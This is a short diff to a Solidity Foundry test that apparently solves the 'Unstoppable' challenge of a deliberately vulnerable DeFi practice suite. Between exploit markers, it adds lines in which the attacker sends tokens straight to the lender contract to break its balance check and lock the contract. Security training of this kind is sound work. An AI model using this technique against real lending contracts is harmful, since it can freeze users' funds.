@@ -60,6 +60,9 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.prank(attacker);
+        dvt.transfer(address(unstoppableLender), INITIAL_ATTACKER_TOKEN_BALANCE);
+
         /**
          * EXPLOIT END *
          */
